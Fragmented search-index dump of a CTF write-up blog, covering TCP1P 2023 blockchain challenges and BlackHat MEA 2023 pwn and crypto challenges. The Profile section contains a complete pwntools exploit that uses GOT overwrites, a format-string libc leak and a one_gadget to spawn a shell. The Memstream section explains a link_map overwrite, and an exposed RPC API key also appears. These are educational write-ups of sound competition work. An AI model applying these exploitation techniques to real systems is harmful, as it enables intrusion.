\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00,TCP1P{d0_3nj0y_th3_p4rty_bu7_4r3_y0u_4_VIP?}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' Flag: TCP1P{d0_3nj0y_th3_p4rty_bu7_4r3_y0u_4_VIP?} ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:10:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Location Description Author: Kiinzu Will you accept the invitation? If so, find the party location now! nc ctf.tcp1p.com 20005 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:11:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution Trying to connect with the provided ip and port, we can see that the challenge is we need to answer a quiz, where given a contract layout, submit the storage SLOT of the password variable. Below is example question: nc ctf.tcp1p.com 20005 ====Going to The Party==== To Find the party location You need to solve a simple riddle regarding a SLOT Answer everything correctly, and find the exact location! Question: In which Slot is Password Stored? You'll answer with and ONLY WITH [numbers] ex: 0,1,2,3,4.....99 Note: - Slot start from 0 - If it doesn't stored on SLOT, answer 0 Identification Required for Guest Question: contract StorageChallenge9 { bytes32 private unique_code; bytes32 private key_12; address private owner; address[20] public player; bool private valid; bytes32 private password; address private enemy; bool private answered; } Answer: To give some background, in EVM, a smart contract has persistent storage, known as “storage”, which exists in a state database, maintaining the information between function calls and transactions. The format is in form of key-value pairs. Each contract state variables are stored in storage slots. A storage slot is capable of holding 32 bytes piece of data. Each slot can be used by one or more state variables, depends on the order and size. For example, consider this contract: contract Example { bytes32 a; address b; bool c; } In the above contract, the variable a, which has bytes32 type (32 bytes), will be stored in SLOT 0, because it is the first state that is defined in the contract. Next, variable b, which has address type (20 bytes), will be stored in SLOT 1, because the SLOT 0 has been occupied by a. Last, variable c which has bool type (1 byte), will be stored in SLOT 1 as well, because the SLOT 1 still has 12 bytes free space due to the fact that variable b only use 20 bytes of the SLOT 1. Note A special case which is mentioned in the chall description (“If it doesn’t stored on SLOT, answer 0”) refers to a contract which has immutable state variable. immutable state variable isn’t stored in the storage, which is why there isn’t any SLOT associated with it. In order to solve this challenge, you can do either manual calculation, or simply compile the contract with solc \u003ccontract_name\u003e --storage-layout like this: solc src/Test.sol --storage-layout ======= src/Test.sol:StorageChallenge9 ======= Contract Storage Layout: {\"storage\":[{\"astId\":3,\"contract\":\"src/Test.sol:StorageChallenge9\",\"label\":\"unique_code\",\"offset\":0,\"slot\":\"0\",\"type\":\"t_bytes32\"},{\"astId\":5,\"contract\":\"src/Test.sol:StorageChallenge9\",\"label\":\"key_12\",\"offset\":0,\"slot\":\"1\",\"type\":\"t_bytes32\"},{\"astId\":7,\"contract\":\"src/Test.sol:StorageChallenge9\",\"label\":\"owner\",\"offset\":0,\"slot\":\"2\",\"type\":\"t_address\"},{\"astId\":11,\"contract\":\"src/Test.sol:StorageChallenge9\",\"label\":\"player\",\"offset\":0,\"slot\":\"3\",\"type\":\"t_array(t_address)20_storage\"},{\"astId\":13,\"contract\":\"src/Test.sol:StorageChallenge9\",\"label\":\"valid\",\"offset\":0,\"slot\":\"23\",\"type\":\"t_bool\"},{\"astId\":15,\"contract\":\"src/Test.sol:StorageChallenge9\",\"label\":\"password\",\"offset\":0,\"slot\":\"24\",\"type\":\"t_bytes32\"},{\"astId\":17,\"contract\":\"src/Test.sol:StorageChallenge9\",\"label\":\"enemy\",\"offset\":0,\"slot\":\"25\",\"type\":\"t_address\"},{\"astId\":19,\"contract\":\"src/Test.sol:StorageChallenge9\",\"label\":\"answered\",\"offset\":20,\"slot\":\"25\",\"type\":\"t_bool\"}],\"types\":{\"t_address\":{\"encoding\":\"inplace\",\"label\":\"address\",\"numberOfBytes\":\"20\"},\"t_array(t_address)20_storage\":{\"base\":\"t_address\",\"encoding\":\"inplace\",\"label\":\"address[20]\",\"numberOfBytes\":\"640\"},\"t_bool\":{\"encoding\":\"inplace\",\"label\":\"bool\",\"numberOfBytes\":\"1\"},\"t_bytes32\":{\"encoding\":\"inplace\",\"label\":\"bytes32\",\"numberOfBytes\":\"32\"}}} Flag: TCP1P{W00t_w00t_t0_th3_p4rty_47JHbddc} ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:11:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"VIP Description Author: Kiinzu A very simple system at a party. If you are a VIP, you can get everything. nc ctf.tcp1p.com 23345 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:12:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution Let’s start by trying to connect to the given instance. nc ctf.tcp1p.com 23345 Welcome to TCP1P Blockchain Challenge 1. How to 101? 2. get Contract \u003e\u003e 1 Same as the last challenge, but this time, call the help() function first nc ctf.tcp1p.com 23345 Welcome to TCP1P Blockchain Challenge 1. How to 101? 2. get Contract \u003e\u003e 2 Contract Addess: 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD RPC URL : https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 To start : Simply call the help() function, everything is written there Note: Due it's deployed on Sepolia network, please use your own Private key to do the transaction If you need funds, you can either DM the probset or get it on https://sepoliafaucet.com/ Let’s start by calling help() function in the given contract with the help of foundry, just like what we did before in the Venue challenge. cast call 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD \"help()\" -r https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001f757656c636f6d6520746f205443503150205072697661746520436c7562210a0a456e6a6f792074686520435446205061727479206f6620796f7572206c6966652068657265210a4275742066697273742e2e2e20506c656173652067697665206d6520796f75722069642c206e6f726d616c2070656f706c652068617665206174206c65617374206d656d62657220726f6c650a4f6620436f757273652c2074686572652061726520616c736f206d616e792056495073206f76657220686572652e20422d290a0a46756e6374696f6e733a0a0a456e7472616e636528726f6c6529202d3e2076657269667920796f757220726f6c6520686572652c2061726520796f752061206d656d626572206f722056495020436c6173730a2020203e20726f6c6520202d2d3e20696e70757420796f757220726f6c6520617320737472696e670a737465616c564950436f64652829202d3e20736f6d656f6e65206d69676874277665206a75737420737465616c20612076697020636f646520616e642077616e7420746f206769766520697420746f20796f750a676574466c616728292020202020202d3e204f6e636520796f752073686f7720796f757220726f6c652c20796f752063616e2074727920796f7572206c75636b21204f4e4c59205649502043616e206765742074686520466c6167210a0a0a000000000000000000 Decoding the hex, we will see this message: Welcome to TCP1P Private Club! Enjoy the CTF Party of your life here! But first... Please give me your id, normal people have at least member role Of Course, there are also many VIPs over here. B-) Functions: Entrance(role) -\u003e verify your role here, are you a member or VIP Class \u003e role --\u003e input your role as string stealVIPCode() -\u003e someone might've just steal a vip code and want to give it to you getFlag() -\u003e Once you show your role, you can try your luck! ONLY VIP Can get the Flag! Based on the message, we can kinda see that the top-down flow to solve this challenge here is: We need to call getFlag() to get the flag. In order to do that, the sender (us) need to be flagged as a certain role by the contract. To set the role, we need to call Entrance(role). Maybe, if the role is correct, there will be some write operations in the contract which will flagged the sender as a VIP member. Seems like the stealVIPCode() can be used to fetch the correct role. Now that we get the idea, let’s start by calling the stealVIPCode() first. cast call 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD \"stealVIPCode()\" -r https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001932049206d6179206f72206d6179206e6f742067657420796f752061207469636b65742c20627574204920646f6e277420756e6465727374616e64206d7563682061626f757420686f7720746f206465636f646520746869732e0a4974277320736f6d6520736f7274206f6620746865697220616269436f64657220706f6c6963792e200a5649502d5469636b65743a20307830303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303230303030303030303030303030303030303030303030303030303030303030","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:12:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Invitation Description Author: Kiinzu An Invitation to an amazing party, only if you find the right location. Note: Please read the 101.txt. ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:13:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution Let’s start by reading the description inside 101.txt: Description: You are provided a bytecode there, yeah? Find out a way to get a certain function name from it, the correct function name begin with \"TCP1P\" string. Flag Format if you manage to find the correct function name do the exact same thing as the example below Found Function name: TCP1P_th1s_1s_4_fl4g_() -\u003e remove the \"()\" -\u003e replace the first \"_\" with \"{\" -\u003e replace the last \"_\" with \"}\" Final and Right flag format: TCP1P{th1s_1s_4_fl4g} So, for this challenge, we were given a contract’s bytecode, and then we need to find the correct function name. To give some background, in EVM, there’s a concept known as a “function selector.” When you write smart contracts in high-level languages like Solidity, these contracts contain functions. However, the EVM doesn’t understand these high-level details directly. Instead, it requires a more compact form to invoke these functions, and that’s where selectors come in. A “selector” is a 4-byte hexadecimal identifier derived from the function’s signature. This signature is composed of the function name and the types of its arguments, serialized into a specific format. The selector itself is produced by taking the Keccak-256 hash of this signature and using only the first 8 characters (4 bytes) of the hash. This process is standardized, ensuring a unique selector for each unique function signature. When a smart contract is compiled, the original code is transformed into bytecode. The function selectors are embedded within this bytecode, acting as the entry points for all the contract’s functions. Each high-level languages has their own strategy on the compiled bytecode looks like, but in summary, usually you can pass input data in hex-form of selector + arguments, then the bytecode will try to fetch the selector that you pass and try to jump to the suitable places. Observed that the selector is not reversible, so in general, given a function selector, we wouldn’t be able to recover the function name. However, there are some online databases that we can use that map these 4-byte selectors back to their original function signatures. The most popular one is this website. So, in order to tackle this challenge, there are actually 2 ways. The proper way and the lazy way :D The lazy way With this approach, we don’t even need to examine the bytecodes :P. It’s important to note that, at this stage, we only have the bytecode. We haven’t identified the specific selector necessary for querying the function name in the database. However, we can guess that perhaps the creator of the challenge has already logged the function name (potentially the flag) in the online database. Another educated guess could be that the challenge author stored the selector function just before the start of the CTF. So, an idea might be to access the database, arrange the entries by ID in descending order, and manually check each entry for a potential flag, starting from the most recent. The premise here is that the flag should be quite close to the recent entries. As it turns out, this educated guess was accurate. The flag was located around page 40, relatively close to the most recent entries in the database. The proper way Let’s start by disassembling the EVM bytecode with my favourite online disassembler. Don’t take a look in the decompiled one, but look at the disassembled output instead. In the bytecode of a compiled contract, usually there will be sequences of opcodes like this: PUSH4 \u003cselector\u003e EQ PUSH \u003ccode_dest\u003e JUMPI The code essentially performs operations comparing the user’s input with the available selectors within the contract. If there’s a match, it prompts the VM to jump to the bytecode of the corresponding selector function. To retrieve all available selectors, we can simply search for the PUSH4 opcode in the disassembled results, then verify each value individually in the online database. Observed that the following sequence appeared in the","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:13:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":" BlackHat MEA CTF 2023 Last weekend, I participated in the qualification round of BlackHat MEA CTF 2023 with my team, DeadSec. Fortunately, we successfully completed all the challenges and ranked 7th. With this performance, we have qualified for the finals, scheduled for 14-16 November 2023 in Riyadh, Saudi Arabia. Below are some write-ups of the challenges from the CTF. Pwn ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:0:0","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Profile Description Give us your profile and we will issue you an ID card. ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:1:0","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were provided with the source code of the binary called main.c to analyze. Here’s the source code: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003ctime.h\u003e struct person_t { int id; int age; char *name; }; void get_value(const char *msg, void *pval) { printf(\"%s\", msg); if (scanf(\"%ld%*c\", (long*)pval) != 1) exit(1); } void get_string(const char *msg, char **pbuf) { size_t n; printf(\"%s\", msg); getline(pbuf, \u0026n, stdin); (*pbuf)[strcspn(*pbuf, \"\\n\")] = '\\0'; } int main() { struct person_t employee = { 0 }; employee.id = rand() % 10000; get_value(\"Age: \", \u0026employee.age); if (employee.age \u003c 0) { puts(\"[-] Invalid age\"); exit(1); } get_string(\"Name: \", \u0026employee.name); printf(\"----------------\\n\" \"ID: %04d\\n\" \"Name: %s\\n\" \"Age: %d\\n\" \"----------------\\n\", employee.id, employee.name, employee.age); free(employee.name); exit(0); } __attribute__((constructor)) void setup(void) { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); srand(time(NULL)); } There’s a type confusion bug wherein, during the assignment of the value to employee.age, the program attempts to scan a long value (8 bytes) instead of an int value (4 bytes). Because of this discrepancy, we experience a 4-byte overflow. Based on the person_t struct, this overflow will overwrite the char pointer of name. Exploiting this bug allows us to trigger the overflow and alter the stored pointer of name. This, in turn, permits arbitrary writes to any address we choose when filling the name via get_string. Additionally, running a checksec on the binary reveals that the compiled binary uses Partial RELRO and No PIE. Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:1:1","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Solution Given the information above, we can see that the combination of Partial RELRO, No PIE, and the binary’s bug easily allows us to overwrite the GOT address of the desired binary. First, we aim for multiple writes. Thus, the initial step is overwriting the GOT address of free to point to main. This action ensures that when the program calls free, it instead invokes the main function again, granting us the capability for repeated arbitrary writes. Next, we seek to leak the libc address. This can be achieved by overwriting the GOT of strcspn to printf. Observed that within the get_string function, there’s a line of code (*pbuf)[strcspn(*pbuf, \"\\n\")] = '\\0';. By overwriting strcspn to printf, and considering pbuf is a pointer to a string under our control, we introduce a new vulnerability: the format string bug. Utilizing this bug, we can leak the libc address. Upon inspection with gdb, the format string %31$p returns the address of __libc_start_call_main+0x80. Lastly, once the libc address is successfully leaked, we can simply overwrite the GOT of free to the relevant one_gadget. Observing the register values when calling free, and examining the available one_gadget within the provided libc in the supplied docker, we find that gadget: 0xebcf5 execve(\"/bin/sh\", r10, rdx) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [rdx] == NULL || rdx == NULL can be used to get a shell. Below is the full script: from pwn import * exe = ELF(\"profile_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.35.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"0.0.0.0\" remote_port = 5000 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: pause() else: r = remote(remote_url, remote_port) return r r = conn() def set_age(age): r.sendlineafter(b'Age: ', str(age).encode()) def set_name(name, is_printf=False): r.sendlineafter(b'Name: ', name) if is_printf: return r.recvline().strip() # Overwrite free to main set_age(exe.got['free'] \u003c\u003c 32) set_name(p64(exe.symbols['main'])[:3]) # Overwrite strcspn to printf set_age(exe.got['strcspn'] \u003c\u003c 32) set_name(p64(exe.plt['printf'])) # Leak libc set_age((exe.bss()+0x200) \u003c\u003c 32) leaked_libc = int(set_name(b'%31$p', is_printf=True), 16) info(f'{hex(leaked_libc) = }') libc.address = leaked_libc -(libc.symbols['__libc_start_call_main']+0x80) info(f'{hex(libc.address) = }') # Overwrite free to one_gadget (r10 null, rdx null) set_age((exe.got['free']) \u003c\u003c 32) set_name(p64(libc.address+0xebcf5)) r.interactive() ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:1:2","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Memstream Description Seek the file. Seek the flag. ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:2:0","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were provided with the source code of the binary called main.c to analyze. Here’s the source code: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #define MEM_MAX 0x1000 char g_buf[MEM_MAX]; off_t g_cur; static void win() { system(\"/bin/sh\"); } size_t getval(const char *msg) { size_t val; printf(\"%s\", msg); if (scanf(\"%ld%*c\", \u0026val) != 1) exit(1); return val; } void do_seek() { off_t cur = getval(\"Position: \"); if (cur \u003e= MEM_MAX) { puts(\"[-] Invalid offset\"); return; } g_cur = cur; puts(\"[+] Done\"); } void do_write() { int size = getval(\"Size: \"); if (g_cur + size \u003e MEM_MAX) { puts(\"[-] Invalid size\"); return; } printf(\"Data: \"); if (fread(g_buf + g_cur, sizeof(char), size, stdin) != size) exit(1); puts(\"[+] Done\"); } int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); puts(\"1. Seek\\n2. Read\\n3. Write\"); while (1) { switch (getval(\"\u003e \")) { case 1: do_seek(); break; case 2: puts(\"You know what you wrote.\"); break; case 3: do_write(); break; default: return 0; } } } Examining the source code, we observe a win function, which can be later utilized to spawn a shell. However, there’s a vulnerability allowing us to initiate an OOB (out-of-bound) write. Noticed that off_t is actually a signed type. That means that invoking do_seek with a negative value will make g_cur becomes negative. This scenario allows us to perform an out-of-bound write (via do_write) to any address located before g_buf in the bss section. This is because the result of the g_cur + size verification will always be less than MEM_MAX. Running a checksec on the compiled binary yielded unexpected results. Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Packer: Packed with UPX The binary is packed with UPX. This detail becomes crucial later as we develop an approach to tackle this challenge. ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:2:1","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Solution Armed with the information mentioned above, we delve into gdb to understand what sets UPX apart. Inspecting the memory mappings, we discern that the binary’s address is positioned below the ld (with a consistent offset difference). 0x00007ffff7fb4000 0x00007ffff7fb6000 0x0000000000002000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fb6000 0x00007ffff7fe0000 0x000000000002a000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fe0000 0x00007ffff7feb000 0x000000000000b000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7feb000 0x00007ffff7fec000 0x0000000000001000 0x0000000000000000 --- 0x00007ffff7fec000 0x00007ffff7fee000 0x0000000000002000 0x0000000000037000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fee000 0x00007ffff7ff0000 0x0000000000002000 0x0000000000039000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7ff1000 0x00007ffff7ff5000 0x0000000000004000 0x0000000000000000 r-- [vvar] 0x00007ffff7ff5000 0x00007ffff7ff7000 0x0000000000002000 0x0000000000000000 r-x [vdso] 0x00007ffff7ff7000 0x00007ffff7ff8000 0x0000000000001000 0x0000000000000000 r-- 0x00007ffff7ff8000 0x00007ffff7ff9000 0x0000000000001000 0x0000000000000000 r-x 0x00007ffff7ff9000 0x00007ffff7ffb000 0x0000000000002000 0x0000000000000000 r-- 0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000002000 0x0000000000000000 rw- From this observation, we infer that the intended solution might involve overwriting data in the linker region. Reading through this writeup provides insights into the linker’s operation. In essence, there exists a link map that retains a pointer to the mapped address of our binary, and this pointer is leveraged during symbol resolution. Experimenting by setting g_cur to -0x7000-0x60+0x12e0 (causing do_write to overwrite the link_map value) and attempting to overwrite it with 0x6161616161616161, we spot a crash in GDB upon the binary’s exit. ----------------------------------------------------------------------------------------------------------------------------------------------------------------- registers ---- $rax : 0x6161616161619ee9 --------------------------------------------------------------------------------------------------------------------------------------------------------------- code:x86:64 ---- 0x7f926114a240 741d \u003cNO_SYMBOL\u003e je 0x7f926114a25f 0x7f926114a242 660f1f440000 \u003cNO_SYMBOL\u003e nop WORD PTR [rax + rax * 1 + 0x0] 0x7f926114a248 488945c8 \u003cNO_SYMBOL\u003e mov QWORD PTR [rbp - 0x38], rax -\u003e 0x7f926114a24c ff10 \u003cNO_SYMBOL\u003e call QWORD PTR [rax] 0x7f926114a24e 488b45c8 \u003cNO_SYMBOL\u003e mov rax, QWORD PTR [rbp - 0x38] 0x7f926114a252 4889c2 \u003cNO_SYMBOL\u003e mov rdx, rax 0x7f926114a255 4883e808 \u003cNO_SYMBOL\u003e sub rax, 0x8 0x7f926114a259 483955c0 \u003cNO_SYMBOL\u003e cmp QWORD PTR [rbp - 0x40], rdx 0x7f926114a25d 75e9 \u003cNO_SYMBOL\u003e jne 0x7f926114a248 Observably, the link_map value increases by 0x3d88, then the value stored at that address gets invoked. This implies that if we can overwrite the link_map to a beneficial address containing our desired value, we gain the ability to invoke any function of our choice. In this scenario, as our aim is to invoke win, we need to locate an address storing the value of our binary address. Through further examination in gdb, we observed that the address bss+0x8 maintains a pointer to itself. Given this knowledge, we can modify the last two bytes to alter the stored pointer to the win address. Subsequently, we overwrite the last two bytes of the link_map so that, post the addition of 0x3d88, it directs to bss+0x8, and the call QWORD PTR [rax] essentially invokes the win function, granting us a shell. It’s worth noting that altering the final two bytes implies that we might need to engage in some bruteforcing, as only the first three nibbles are static. In summary: Modify the last two bytes of bss+0x8 to point to the win() address. Adjust the final two bytes of link_map so that the re","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:2:2","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Octopodal Description With eight legs I can run so much faster, just look at me goooo ~ ! ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:3:0","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were provided with the source code of the server called server.py to analyze. Here’s the source code: #!/usr/bin/env python3 # # BlackHat MEA 2023 CTF Quals # # [Easy] Crypto - Octopodal # # Native imports import os from sympy.ntheory import legendre_symbol # Non-native imports from Crypto.Util.number import getPrime # pip install pycryptodome # Flag import FLAG = os.environ.get('FLAG', 'FLAG{TH1S_1S_JUST_S0M3_D3BUG_FL4G}').encode() # Challenge set-up primeNumber = 8 primeBits = 24 primeList = [getPrime(primeBits) for _ in range(primeNumber)] modulus = 1 for prime in primeList: modulus *= prime base = 2 # Server loop HDR = \"\"\"| | _______ _______ _______ _______ _______ _______ ______ _______ ___ | | _ | _ | | _ | _ | _ | _ \\ | _ | | | |. | |. 1___|.| | |. | |. 1 |. | |. | \\|. 1 |. | | |. | |. |___`-|. |-|. | |. ____|. | |. | |. _ |. |___ | |: 1 |: 1 | |: | |: 1 |: | |: 1 |: 1 |: | |: 1 | | |::.. . |::.. . | |::.| |::.. . |::.| |::.. . |::.. . /|::.|:. |::.. . | | `-------`-------' `---' `-------`---' `-------`------' `--- ---`-------' |\"\"\" k = (modulus.bit_length() - 1) // primeBits flagPieces = [int.from_bytes(FLAG[i:i+k], 'big') for i in range(0, len(FLAG), k)] encryptedPieces = [pow(base, i, modulus) for i in flagPieces] print('|\\n| ~ Flag pieces:') for i,j in enumerate(encryptedPieces): print('| {}: 0x{:0{n}x}'.format(i, j, n=-(-modulus.bit_length()//4))) def LegSum(x, primes): return sum(legendre_symbol(x, p) for p in primes) while True: try: x = int(input('|\\n| \u003e (int) ')) print('| L = {}'.format(LegSum(x, primeList))) except KeyboardInterrupt: print('\\n|\\n| ~ Sum you later ~ !\\n|') break except: print('|\\n| ~ Ehm are you alright ~ ?') Looking through the source code reveals that the server performs the following actions: Generates 8 primes (24-bit) and employs them as the modulus. Divides the flag into multiple pieces. Encrypts it by evaluating pow(2, flag_piece, modulus). Outputs the encrypted pieces. Accepts any input termed x, and the server returns the sum of the outcome of legendre_symbol(x, p), where p represents each prime factor of the modulus. ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:3:1","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Solution legendre_symbols can only produce three possible outcomes: 1 if x is a quadratic residue and a ≢ 0 mod p. -1 if x is a quadratic non-residue mod p. 0 if x ≡ 0 mod p. Considering that 8 primes are in play, if we input a number where exactly one of its factor matches one of the primes, the resultant sum will be odd. This observation allows us to employ binary search to discern the factors. Notably, the deployed prime spans 24 bits. We can easily generate all primes within these 24 bits. Approximately ~500k primes fit the 24-bit criteria. We can divide these primes into multiple blocks, each containing 500 primes. Then, we can multiply every prime within a block. Sending this value to the server, if the returned sum is odd, it implies that a prime within the current block is a prime factor of the modulus. To speed-up the process, we can apply binary search within the current chunk. For every iteration, we input the multiplication outcome of half the chunk to the server. If the result is even, we discard the initial half; otherwise, we dispose the latter half. This cycle continues until we identify a single number yielding an odd result, which is the prime factor of the modulus. Iterating this procedure enables us to reconstruct all the primes and compute the modulus leveraged during the encryption. Then, we can easily use discrete_log(ct, Mod(2, n)) in sagemath to retrieve the flag segment. Here’s the full script: from pwn import * import math # # Generate primes # primes_24 = [] # curr_prime = 2**23 # while curr_prime \u003c 2**24: # curr_prime = next_prime(curr_prime) # primes_24.append(curr_prime) # info(f'{2**24 - curr_prime}') # print(primes_24) # exit() primes_24 = eval(open('primes_24', 'r').read()) # Setup connection url = b'54.78.163.105' port = int(30562) if not args.LOCAL: r = remote(url, port) else: r = process(['python3', 'server.py']) target = sorted(eval(r.recvline().strip())) # Fetch cts cts = [] for i in range(6): r.recvuntil(f'{i}: '.encode()) cts.append(int(r.recvline().strip(), 16)) info(f'{cts = }') # Helper to get legendre sum def get_legendre_sum(val): r.recvuntil(b'int) ') r.sendline(str(val).encode()) r.recvuntil(b'L = ') out = int(r.recvline().strip()) return out # Helper to binary search the prime factor def search_prime(arr): low = 0 high = len(arr) - 1 mid = 0 while low \u003c high: mid = (high + low) // 2 new_val = math.prod(arr[:mid+1]) res = get_legendre_sum(new_val) if res % 2 == 0: low = mid + 1 else: high = mid assert low==high return low recovered_primes = [] start_i = 0 gap = 500 while len(recovered_primes) \u003c 8: for i in range(start_i, len(primes_24), gap): val = (math.prod(primes_24[i:i+gap])) # Multiply numbers from primes_24[i..i+gap] out = get_legendre_sum(val) is_odd = out % 2 == 1 if is_odd: # odd == we find a good array info(f'{val = }') info(f'{i = }, {i//gap = }') info(f'{out = }, odd = {is_odd}') start_i = i break arr = primes_24[start_i:start_i+gap] # There is one prime factor in this array # Do binary search print(f'Start binary search...') idx = search_prime(arr) info(f'prime factor: {arr[idx]}') recovered_primes.append(arr[idx]) print(f'{recovered_primes = }') start_i += gap print(f'{recovered_primes = }') if args.LOCAL: print(f'{target = }') print(f'{cts = }') exit() ''' # Sagemath script to decrypt the flag from Crypto.Util.number import * def recover_flag(recovered_primes, cts): n = prod(recovered_primes) flag = b\"\" for ct in cts: flag += long_to_bytes(int(discrete_log(ct, Mod(2, n)))) return flag recovered_primes = [] cts = [] print(recover_flag(recovered_primes, cts)) ''' Web ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:3:2","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 2023","uri":"/posts/blackhat-mea-ctf-2023/"},{"categories":null,"content":"Hardy Description We’ve managed to retrieve the credentials for this amazing hacking interface, user:password, can you help us get the flag? We’re definitely not tricking you to steal your IP! ","date":"Oct 10, 2023","objectID":"/posts/blackhat-mea-ctf-2023/:4:0","tags":["Writeup","BlackHat","2023","pwn","crypto","binary search","linker","ssti","sqli"],"title":"BlackHat MEA CTF 